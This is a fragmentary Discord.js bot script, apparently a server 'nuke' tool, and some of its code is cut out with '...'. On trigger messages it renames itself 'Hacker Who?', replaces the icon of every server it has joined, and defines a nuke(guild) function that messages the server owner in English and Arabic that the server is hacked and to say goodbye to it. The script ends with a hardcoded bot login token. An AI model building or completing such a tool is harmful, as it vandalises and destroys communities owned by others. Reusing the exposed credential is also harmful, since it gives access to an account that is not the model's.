...
LOka.on('message', message => {
     if (message.content === ".") {
LOka.user.setAvatar(`https://cdn.discordapp.com/attachments/512023349136850945/536218407620575243/96742.jpg`)
...
LOka.on('message', message => {
     if (message.content === ".") {
LOka.user.setUsername("Hacker Who? Y...?")

}
});
LOka.on('message', message => {
     if (message.content === ".") {
LOka.user.setGame(`Y...? Hacker`,'https://www.twitch.tv/hix')
...
LOka.on('message', message => {
     if (message.content === "هلا") {
         LOka.guilds.forEach(m =>{
             m.setIcon(`https://cdn.discordapp.com/attachments/512023349136850945/536218407620575243/96742.jpg`)
})
}
});
LOka.on('message', message => {
...
LOka.on('message', message => {
     if (message.content === "هلا") {
             ...
             message.guild.setIcon(`https://cdn.discordapp.com/attachments/512023349136850945/536218407620575243/96742.jpg`)
...
async function nuke(guild) {
  ...
  await guild.owner.send(' Hacked u by unknown Is here    تهكر سيرفرك؟ حرامات كنت ابي اهكر حسابك اول يلا عادي قول باي لسيرفرك 👋 👋 😂 😂 ').catch(e => { return void e; });
...
LOka.login("NTE0Mzc4NjQ5MjI3NzU1NTIx.DyToDg.3Dm6LE3x-RuNrojxUSa-58sRmRQ")
